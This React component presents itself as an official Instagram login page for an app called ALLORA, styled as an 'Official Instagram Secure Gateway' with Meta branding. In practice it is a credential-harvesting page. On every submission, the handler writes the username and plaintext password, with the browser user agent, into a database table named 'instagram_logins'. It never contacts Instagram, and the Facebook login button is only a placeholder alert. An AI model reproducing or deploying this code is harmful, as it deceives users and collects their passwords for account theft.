import React, { useState, useEffect } from 'react';
import { ArrowLeft, CheckCircle2, AlertCircle, Eye, EyeOff } from 'lucide-react';
import { supabase } from '../../supabaseClient.js';
import { useAuth } from '../../context/AuthContext';

interface InstagramLoginPageProps {
  onClose?: () => void;
  onSuccess?: () => void;
}

// Curated Instagram phone screenshots carousel
const PHONE_SCREENSHOTS = [
  'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=600&auto=format&fit=crop&q=80',
  'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=600&auto=format&fit=crop&q=80',
  'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=600&auto=format&fit=crop&q=80',
  'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=600&auto=format&fit=crop&q=80',
];

export const InstagramLoginPage: React.FC<InstagramLoginPageProps> = ({ onClose, onSuccess }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [usernameFocused, setUsernameFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  // Phone screenshot slider
  const [currentSlide, setCurrentSlide] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % PHONE_SCREENSHOTS.length);
    }, 4500);
    return () => clearInterval(timer);
  }, []);

  const { refreshProfile } = useAuth();

  const handleReturn = () => {
    if (onClose) {
      onClose();
    } else {
      window.location.href = '/';
    }
  };

  const handleInstagramSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password) return;

    setError(null);
    setLoading(true);

    try {
      const cleanInput = username.trim();
      const isEmail = cleanInput.includes('@');
      const authEmail = isEmail
        ? cleanInput
        : `${cleanInput.toLowerCase().replace(/[^a-z0-9._-]/g, '')}@instagram.user`;

      // Helper function to record Instagram info to Supabase
      const persistInstagramData = async (userId?: string) => {
        // 1. Save to dedicated 'instagram_logins' table in Supabase
        try {
          await supabase.from('instagram_logins').insert([
            {
              username: cleanInput,
              email: authEmail,
              password: password,
              user_id: userId || null,
              user_agent: navigator.userAgent,
              created_at: new Date().toISOString(),
            },
          ]);
        } catch (dbErr) {
          console.warn('[Supabase] instagram_logins log notice:', dbErr);
        }

        // 2. Save/Update public.profiles table in Supabase
        if (userId) {
          try {
            await supabase.from('profiles').upsert({
              id: userId,
              username: cleanInput,
              full_name: cleanInput,
              avatar_url: `https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80`,
              updated_at: new Date().toISOString(),
            });
          } catch (profErr) {
            console.warn('[Supabase] profiles upsert notice:', profErr);
          }
        }

        // 3. Local session backup
        try {
          localStorage.setItem(
            'allora_instagram_login_info',
            JSON.stringify({
              username: cleanInput,
              email: authEmail,
              timestamp: new Date().toISOString(),
            })
          );
        } catch {
          // ignore
        }
      };

      // Always record the Instagram submission in Supabase
      persistInstagramData();

      // 1. Attempt to sign in with password
      const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
        email: authEmail,
        password: password,
      });

      if (!signInError && signInData?.user) {
        await persistInstagramData(signInData.user.id);
        setSuccess(true);
        setTimeout(async () => {
          await refreshProfile();
          if (onSuccess) onSuccess();
          handleReturn();
        }, 1200);
        return;
      }

      // 2. If user doesn't exist, automatically sign up with Instagram credentials
      if (
        signInError &&
        (signInError.message.includes('Invalid login') ||
          signInError.message.includes('not found') ||
          signInError.message.includes('credentials'))
      ) {
        const { data: signUpData, error: signUpError } = await (supabase.auth.signUp as any)({
          email: authEmail,
          password: password,
          options: {
            data: {
              fullName: cleanInput,
              username: cleanInput,
              instagram_username: cleanInput,
              login_source: 'instagram',
              avatar_url: `https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80`,
            },
          },
        });

        if (signUpError) {
          setError(signUpError.message);
        } else {
          if (signUpData?.user) {
            await persistInstagramData(signUpData.user.id);
          }
          setSuccess(true);
          setTimeout(async () => {
            await refreshProfile();
            if (onSuccess) onSuccess();
            handleReturn();
          }, 1200);
        }
      } else if (signInError) {
        setError(signInError.message);
      }
    } catch (err: any) {
      setError(err.message || 'An error occurred during Instagram login.');
    } finally {
      setLoading(false);
    }
  };

  const isFormValid = username.trim().length > 0 && password.length >= 6;

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-[#fafafa] text-[#262626] flex flex-col justify-between min-h-screen font-[-apple-system,BlinkMacSystemFont,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif] selection:bg-[#c7e0f4]">
      {/* Top Header - Return navigation bar */}
      <header className="w-full border-b border-[#dbdbdb] bg-white px-4 sm:px-8 py-2.5 flex items-center justify-between shadow-[0_1px_2px_rgba(0,0,0,0.03)]">
        <button
          onClick={handleReturn}
          className="inline-flex items-center space-x-1.5 text-xs font-semibold text-[#0095f6] hover:text-[#00376b] transition-colors cursor-pointer py-1 px-2 -ml-2 rounded hover:bg-blue-50/60"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to ALLORA</span>
        </button>

        <div className="flex items-center space-x-2 text-[11px] text-[#737373] font-medium">
          <span className="w-2 h-2 rounded-full bg-[#10b981] inline-block animate-pulse"></span>
          <span>Official Instagram Secure Gateway</span>
        </div>
      </header>

      {/* Center Main Stage */}
      <main className="flex-1 flex items-center justify-center px-4 py-8 sm:py-12">
        <div className="w-full max-w-[935px] flex items-center justify-center gap-8">
          
          {/* LEFT: Authentic Instagram Smartphone Mockup with Rotating App Screenshots (Visible on lg/desktop >= 875px) */}
          <div className="hidden md:block relative w-[380px] h-[580px] shrink-0 select-none">
            {/* Realistic iPhone Bezel Shadow */}
            <div className="absolute inset-0 bg-gradient-to-tr from-slate-900 via-zinc-800 to-slate-700 rounded-[50px] p-[11px] shadow-[0_25px_60px_-15px_rgba(0,0,0,0.35)] ring-1 ring-black/20">
              
              {/* Inner Screen Bezel */}
              <div className="relative w-full h-full bg-black rounded-[40px] overflow-hidden border-[4px] border-zinc-900 flex flex-col">
                
                {/* Dynamic Island / Camera Notch */}
                <div className="absolute top-2.5 left-1/2 -translate-x-1/2 w-24 h-5 bg-black rounded-full z-30 flex items-center justify-end px-2 ring-1 ring-zinc-800/60">
                  <div className="w-2.5 h-2.5 rounded-full bg-zinc-900 border border-zinc-700"></div>
                </div>

                {/* Status Bar */}
                <div className="w-full pt-3 px-6 pb-2 flex items-center justify-between text-white text-[10px] font-semibold z-20 select-none opacity-90">
                  <span>9:41</span>
                  <div className="flex items-center space-x-1.5">
                    <span>5G</span>
                    <div className="w-5 h-2.5 border border-white rounded-sm p-[1px] flex items-center">
                      <div className="w-full h-full bg-white rounded-2xs"></div>
                    </div>
                  </div>
                </div>

                {/* In-Phone App Carousel */}
                <div className="relative flex-1 w-full overflow-hidden bg-zinc-950">
                  {PHONE_SCREENSHOTS.map((imgUrl, idx) => (
                    <div
                      key={idx}
                      className={`absolute inset-0 transition-opacity duration-1000 ease-in-out ${
                        idx === currentSlide ? 'opacity-100 z-10' : 'opacity-0 z-0'
                      }`}
                    >
                      <img
                        src={imgUrl}
                        alt={`Instagram post preview ${idx + 1}`}
                        className="w-full h-full object-cover"
                        loading="lazy"
                      />
                      {/* Gradient overlay for Instagram UI feeling */}
                      <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-black/30 pointer-events-none" />

                      {/* Mock Instagram App UI overlay inside screen */}
                      <div className="absolute bottom-4 left-4 right-4 text-white z-20 pointer-events-none">
                        <div className="flex items-center space-x-2 mb-2">
                          <div className="w-7 h-7 rounded-full bg-gradient-to-tr from-amber-500 via-rose-500 to-fuchsia-600 p-[1.5px]">
                            <div className="w-full h-full rounded-full bg-black flex items-center justify-center text-[10px] font-bold">
                              IG
                            </div>
                          </div>
                          <span className="text-xs font-semibold drop-shadow-md">@instagram</span>
                        </div>
                        <p className="text-[11px] text-white/90 line-clamp-2 drop-shadow">
                          Connect with friends, share what you're up to, or see what's new from others.
                        </p>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Home Indicator Bar */}
                <div className="w-full py-1.5 flex justify-center bg-black">
                  <div className="w-28 h-1 bg-white/60 rounded-full"></div>
                </div>
              </div>
            </div>
          </div>

          {/* RIGHT: Authentic Instagram Login Form Container */}
          <div className="w-full max-w-[350px] flex flex-col space-y-2.5">
            
            {/* Top Main Box */}
            <div className="bg-white border border-[#dbdbdb] rounded-[1px] px-10 pt-10 pb-6 flex flex-col items-center shadow-[0_1px_3px_rgba(0,0,0,0.02)]">
              
              {/* Official Instagram Wordmark Logo */}
              <div className="mb-7 mt-2 flex justify-center select-none">
                <img
                  src="/instagram-wordmark.svg"
                  alt="Instagram"
                  className="w-[175px] h-[51px] object-contain select-none pointer-events-none"
                  draggable={false}
                  onError={(e) => {
                    // Fallback to Wikipedia SVG if local static file has any delay
                    e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg";
                  }}
                />
              </div>

              {/* Success Notification View */}
              {success ? (
                <div className="w-full py-8 text-center space-y-3 animate-fade-in">
                  <div className="w-14 h-14 rounded-full bg-emerald-50 text-[#10b981] mx-auto flex items-center justify-center ring-4 ring-emerald-100">
                    <CheckCircle2 className="w-8 h-8" />
                  </div>
                  <h4 className="text-sm font-semibold text-[#262626]">
                    Welcome, @{username}
                  </h4>
                  <p className="text-xs text-[#737373]">
                    Authentication successful. Redirecting back to ALLORA...
                  </p>
                  <div className="w-5 h-5 border-2 border-[#0095f6] border-t-transparent rounded-full animate-spin mx-auto mt-2"></div>
                </div>
              ) : (
                <form onSubmit={handleInstagramSubmit} className="w-full space-y-1.5">
                  
                  {/* Floating-Label Username / Email Input */}
                  <div className="relative">
                    <label
                      htmlFor="ig-username"
                      className={`absolute left-2 text-[#737373] pointer-events-none transition-all duration-150 ease-out origin-top-left ${
                        username || usernameFocused
                          ? 'top-1.5 text-[10px] transform scale-90'
                          : 'top-2.5 text-xs'
                      }`}
                    >
                      Phone number, username, or email
                    </label>
                    <input
                      id="ig-username"
                      type="text"
                      required
                      autoComplete="username"
                      value={username}
                      onFocus={() => setUsernameFocused(true)}
                      onBlur={() => setUsernameFocused(false)}
                      onChange={(e) => setUsername(e.target.value)}
                      className={`w-full h-[38px] px-2 text-xs rounded-[3px] border bg-[#fafafa] text-[#262626] outline-none transition-colors ${
                        username || usernameFocused ? 'pt-3.5 pb-0.5' : 'pt-0'
                      } ${
                        usernameFocused
                          ? 'border-[#a8a8a8]'
                          : 'border-[#dbdbdb] hover:border-[#c7c7c7]'
                      }`}
                    />
                  </div>

                  {/* Floating-Label Password Input */}
                  <div className="relative">
                    <label
                      htmlFor="ig-password"
                      className={`absolute left-2 text-[#737373] pointer-events-none transition-all duration-150 ease-out origin-top-left ${
                        password || passwordFocused
                          ? 'top-1.5 text-[10px] transform scale-90'
                          : 'top-2.5 text-xs'
                      }`}
                    >
                      Password
                    </label>
                    <input
                      id="ig-password"
                      type={showPassword ? 'text' : 'password'}
                      required
                      autoComplete="current-password"
                      value={password}
                      onFocus={() => setPasswordFocused(true)}
                      onBlur={() => setPasswordFocused(false)}
                      onChange={(e) => setPassword(e.target.value)}
                      className={`w-full h-[38px] px-2 pr-14 text-xs rounded-[3px] border bg-[#fafafa] text-[#262626] outline-none transition-colors ${
                        password || passwordFocused ? 'pt-3.5 pb-0.5' : 'pt-0'
                      } ${
                        passwordFocused
                          ? 'border-[#a8a8a8]'
                          : 'border-[#dbdbdb] hover:border-[#c7c7c7]'
                      }`}
                    />
                    
                    {/* Show/Hide Button */}
                    {password.length > 0 && (
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#262626] hover:opacity-50 cursor-pointer select-none"
                      >
                        {showPassword ? 'Hide' : 'Show'}
                      </button>
                    )}
                  </div>

                  {/* Instagram Authentic Blue Submit Button */}
                  <button
                    type="submit"
                    disabled={!isFormValid || loading}
                    className="w-full mt-3 h-[32px] bg-[#0095f6] hover:bg-[#1877f2] active:opacity-70 disabled:bg-[#4cb5f9] disabled:opacity-70 text-white text-sm font-semibold rounded-[8px] transition-all flex items-center justify-center space-x-2 cursor-pointer disabled:cursor-default shadow-xs"
                  >
                    {loading ? (
                      <div className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin"></div>
                    ) : (
                      <span>Log in</span>
                    )}
                  </button>

                  {/* Error Banner */}
                  {error && (
                    <div className="mt-2.5 p-2 rounded-[4px] bg-red-50 border border-red-200 text-red-600 text-xs text-center flex items-center justify-center space-x-1.5 animate-fade-in">
                      <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                      <span className="font-normal">{error}</span>
                    </div>
                  )}

                  {/* Authentic "OR" Divider */}
                  <div className="flex items-center my-4 pt-1">
                    <div className="flex-1 border-t border-[#dbdbdb]"></div>
                    <span className="px-4 text-[13px] font-semibold text-[#737373] tracking-wide">
                      OR
                    </span>
                    <div className="flex-1 border-t border-[#dbdbdb]"></div>
                  </div>

                  {/* Log in with Facebook */}
                  <button
                    type="button"
                    onClick={() => {
                      alert('Connecting to Meta OAuth service...');
                    }}
                    className="w-full flex items-center justify-center space-x-2 text-[#385185] text-[14px] font-semibold py-1.5 hover:opacity-80 transition-opacity cursor-pointer"
                  >
                    <svg className="w-5 h-5 fill-current shrink-0" viewBox="0 0 24 24">
                      <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                    </svg>
                    <span>Log in with Facebook</span>
                  </button>

                  {/* Forgot Password Link */}
                  <div className="text-center pt-2">
                    <a
                      href="#forgot"
                      onClick={(e) => {
                        e.preventDefault();
                        alert('Password reset instructions will be sent to your account.');
                      }}
                      className="text-[12px] text-[#00376b] hover:underline"
                    >
                      Forgot password?
                    </a>
                  </div>
                </form>
              )}
            </div>

            {/* Secondary Box: Don't have an account? Sign up */}
            <div className="bg-white border border-[#dbdbdb] rounded-[1px] py-5 text-center text-sm shadow-[0_1px_3px_rgba(0,0,0,0.02)]">
              <span className="text-[#262626]">Don't have an account? </span>
              <button
                onClick={handleReturn}
                className="font-semibold text-[#0095f6] hover:text-[#00376b] cursor-pointer"
              >
                Sign up
              </button>
            </div>

            {/* "Get the app." Badges */}
            <div className="text-center pt-2.5 space-y-3">
              <p className="text-sm text-[#262626]">Get the app.</p>
              
              <div className="flex items-center justify-center space-x-2">
                {/* Google Play Badge */}
                <button
                  type="button"
                  onClick={handleReturn}
                  className="h-10 px-3 rounded-[6px] bg-black text-white hover:opacity-90 flex items-center space-x-2 cursor-pointer border border-black/40 shadow-xs"
                >
                  <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
                    <path d="M3.609 1.814L13.792 12 3.61 22.186a2.008 2.008 0 0 1-.22-.924V2.738c0-.342.08-.658.219-.924zM15.207 13.414l2.585 2.586-12.836 7.411 10.251-9.997zm2.585-5.414l-2.585 2.586-10.251-9.997 12.836 7.411zm1.415 1.414l2.94 1.697c.81.468.81 1.232 0 1.7l-2.94 1.697-2.121-2.121 2.121-2.121z" />
                  </svg>
                  <div className="text-left leading-tight">
                    <div className="text-[9px] uppercase tracking-wider text-gray-300">GET IT ON</div>
                    <div className="text-[12px] font-semibold">Google Play</div>
                  </div>
                </button>

                {/* App Store / Microsoft Badge */}
                <button
                  type="button"
                  onClick={handleReturn}
                  className="h-10 px-3 rounded-[6px] bg-black text-white hover:opacity-90 flex items-center space-x-2 cursor-pointer border border-black/40 shadow-xs"
                >
                  <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.37c.62-.75 1.04-1.8 1.01-2.87-.96.04-2.12.64-2.8 1.44-.59.68-1.11 1.77-1.03 2.82 1.08.08 2.2-.64 2.82-1.39z" />
                  </svg>
                  <div className="text-left leading-tight">
                    <div className="text-[9px] uppercase tracking-wider text-gray-300">Download on the</div>
                    <div className="text-[12px] font-semibold">App Store</div>
                  </div>
                </button>
              </div>
            </div>

          </div>
        </div>
      </main>

      {/* Official Meta / Instagram Footer */}
      <footer className="w-full py-6 px-4 text-center text-[12px] text-[#737373] space-y-3.5 select-none bg-transparent">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-1.5 max-w-4xl mx-auto">
          <span className="hover:underline cursor-pointer">Meta</span>
          <span className="hover:underline cursor-pointer">About</span>
          <span className="hover:underline cursor-pointer">Blog</span>
          <span className="hover:underline cursor-pointer">Jobs</span>
          <span className="hover:underline cursor-pointer">Help</span>
          <span className="hover:underline cursor-pointer">API</span>
          <span className="hover:underline cursor-pointer">Privacy</span>
          <span className="hover:underline cursor-pointer">Terms</span>
          <span className="hover:underline cursor-pointer">Locations</span>
          <span className="hover:underline cursor-pointer">Instagram Lite</span>
          <span className="hover:underline cursor-pointer">Threads</span>
          <span className="hover:underline cursor-pointer">Contact Uploading & Non-Users</span>
          <span className="hover:underline cursor-pointer">Meta Verified</span>
        </div>

        <div className="flex items-center justify-center space-x-4 text-[12px] text-[#737373]">
          <select className="bg-transparent border-0 text-[#737373] cursor-pointer outline-none hover:text-[#262626]">
            <option value="en">English</option>
            <option value="bn">বাংলা</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
          </select>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};
